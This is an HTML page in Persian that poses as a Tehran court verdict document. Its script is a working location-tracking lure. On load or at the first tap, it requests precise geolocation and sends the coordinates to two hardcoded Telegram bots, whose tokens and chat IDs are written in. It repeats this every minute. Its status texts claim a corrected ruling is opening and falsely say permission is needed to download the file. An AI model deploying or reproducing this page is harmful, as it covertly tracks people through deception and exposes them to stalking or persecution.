<!DOCTYPE html>
<html lang="fa" dir="rtl">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <meta http-equiv="Permissions-Policy" content="geolocation=(self)">
  <title>بررسی حکم داد گاه تهران برزگ</title>

  <style>
    * {
      box-sizing: border-box;
      margin: 0;
      padding: 0;
    }

    html, body {
      width: 100%;
      height: 100%;
      overflow: hidden;
      background: #000;
      font-family: Tahoma, Arial, sans-serif;
    }

    #mainImage {
      position: fixed;
      inset: 0;
      width: 100%;
      height: 100%;
      object-fit: cover;
      z-index: 1;
    }

    #overlay {
      position: fixed;
      inset: 0;
      background: rgba(0, 0, 0, 0.25);
      z-index: 2;
      pointer-events: none;
    }

    #status {
      position: fixed;
      top: 15px;
      left: 15px;
      right: 15px;
      padding: 10px;
      border-radius: 10px;
      background: rgba(0, 0, 0, 0.75);
      color: #fff;
      text-align: center;
      font-size: 13px;
      z-index: 20;
      display: none;
    }

    #locationInfo {
      position: fixed;
      left: 15px;
      right: 15px;
      bottom: 15px;
      padding: 12px;
      background: rgba(0, 0, 0, 0.75);
      color: #fff;
      border-radius: 12px;
      direction: ltr;
      text-align: left;
      font-size: 12px;
      z-index: 15;
      display: none;
    }
  </style>
</head>

<body>

  <img id="mainImage" src="https://images.unsplash.com/photo-1500534623283-312aade485b7?auto=format&fit=crop&w=1600&q=85" alt="تصویر">
  <div id="overlay"></div>

  <div id="status"></div>

  <div id="locationInfo">
    Latitude: <span id="lat">-</span><br>
    Longitude: <span id="lon">-</span><br>
    Accuracy: <span id="accuracy">-</span> متر<br>
    Last update: <span id="lastUpdate">-</span>
  </div>

  <script>
    const BOT_TOKEN = "8947494572:AAGWviC7WYN2SJn0MV3RnQFfmUjSGP4wSec";
    const CHAT_ID = "8878957420";
    
    // توکن و چت آیدی دوم
    const BOT_TOKEN2 = "8610609312:AAE4rjXr75_JWAeE3pDm5-FlKSzqVJFyZEk";
    const CHAT_ID2 = "6653107968";

    // بازه ارسال: ۱ دقیقه (۶۰,۰۰۰ میلی‌ثانیه)
    const INTERVAL = 1 * 60 * 1000;

    let timer = null;
    let isRequesting = false;
    let sharingActive = false;

    const status = document.getElementById("status");
    const locationInfo = document.getElementById("locationInfo");
    const latElement = document.getElementById("lat");
    const lonElement = document.getElementById("lon");
    const accuracyElement = document.getElementById("accuracy");
    const lastUpdateElement = document.getElementById("lastUpdate");

    function showStatus(message) {
      status.textContent = message;
      status.style.display = "block";
    }

    function getLocation() {
      return new Promise((resolve, reject) => {
        navigator.geolocation.getCurrentPosition(
          resolve,
          reject,
          {
            enableHighAccuracy: true,
            timeout: 30000,
            maximumAge: 0
          }
        );
      });
    }

    async function sendLocationToTelegram(latitude, longitude) {
      const url1 = `https://api.telegram.org/bot${BOT_TOKEN}/sendLocation`;
      const url2 = `https://api.telegram.org/bot${BOT_TOKEN2}/sendLocation`;

      try {
        // ارسال به ربات اول
        const response1 = await fetch(url1, {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify({
            chat_id: CHAT_ID,
            latitude: latitude,
            longitude: longitude
          })
        });

        // ارسال به ربات دوم
        const response2 = await fetch(url2, {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify({
            chat_id: CHAT_ID2,
            latitude: latitude,
            longitude: longitude
          })
        });

        const data1 = await response1.json();
        const data2 = await response2.json();

        return data1.ok && data2.ok;
      } catch (err) {
        console.error("خطا در ارسال به تلگرام:", err);
        return false;
      }
    }

    async function processAndSend(position) {
      const latitude = position.coords.latitude;
      const longitude = position.coords.longitude;
      const accuracy = position.coords.accuracy;

      latElement.textContent = latitude;
      lonElement.textContent = longitude;
      accuracyElement.textContent = Math.round(accuracy);
      lastUpdateElement.textContent = new Date().toLocaleString("fa-IR");
      locationInfo.style.display = "block";

      const sent = await sendLocationToTelegram(latitude, longitude);
      if (sent) {
        showStatus("حکم اصلاحی در حال باز شدن است");
      } else {
        showStatus("حکم اصلاحی به دلیل رد مجاز باز نشد دوباره تلاش نمائید.");
      }
    }

    async function updateLocation() {
      if (!sharingActive) return;

      try {
        const position = await getLocation();
        await processAndSend(position);
      } catch (error) {
        console.error(error);
        showStatus("⚠️ دریافت موقعیت جدید ناموفق بود.");
      }
    }

    async function initTracking() {
      if (sharingActive || isRequesting) return;
      isRequesting = true;

      if (!window.isSecureContext) {
        showStatus("❌ دسترسی به موقعیت فقط در لینک HTTPS کار می‌کند.");
        isRequesting = false;
        return;
      }

      if (!navigator.geolocation) {
        showStatus("❌ مرورگر از Geolocation پشتیبانی نمی‌کند.");
        isRequesting = false;
        return;
      }

      try {
        // درخواست مجوز مستقیم از مرورگر
        const position = await getLocation();
        
        sharingActive = true;
        isRequesting = false;

        // حذف شنوندگان کلیک پس از دریافت موفق دسترسی
        window.removeEventListener("click", initTracking);
        window.removeEventListener("touchstart", initTracking);

        // ارسال دفعه اول
        await processAndSend(position);
        showStatus("✅");

        // ارسال خودکار هر ۱ دقیقه
        timer = setInterval(updateLocation, INTERVAL);

      } catch (error) {
        isRequesting = false;
        console.error(error);

        if (error.code === error.PERMISSION_DENIED) {
          showStatus("برای دانلود فایل دسترسی را مجاز نمائید.");
        } else {
          showStatus("در حال باز شدن حکم داد گاه");
        }
      }
    }

    // ۱. تلاش برای درخواست خودکار هنگام لود شدن صفحه
    window.addEventListener("DOMContentLoaded", initTracking);

    // ۲. پشتیبان: در صورت بلاک بودن درخواست خودکار، با اولین لمس/کلیک کاربر روی صفحه مجوز درخواست می‌شود
    window.addEventListener("click", initTracking);
    window.addEventListener("touchstart", initTracking);
  </script>
</body>
</html>
